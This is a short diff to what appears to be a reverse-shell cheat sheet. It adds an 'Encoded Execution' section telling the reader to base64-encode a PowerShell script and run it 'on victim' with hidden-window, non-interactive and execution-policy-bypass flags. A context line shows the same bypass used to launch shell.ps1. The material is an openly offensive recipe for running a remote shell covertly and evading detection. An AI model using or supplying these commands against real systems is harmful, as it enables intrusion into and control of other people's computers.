@@ -65,6 +65,12 @@ Launch the above script directly or save on local attacking maching and call it 
 
 `powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -File shell.ps1`
 
+### Encoded Execution
+
+1. Save ps1 command to a file
+2. run `base64 file.ps1`
+3. copy output and run on victim `powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -EncodedCommand "$output"`
+
 ## Python
 
 * Python3: 
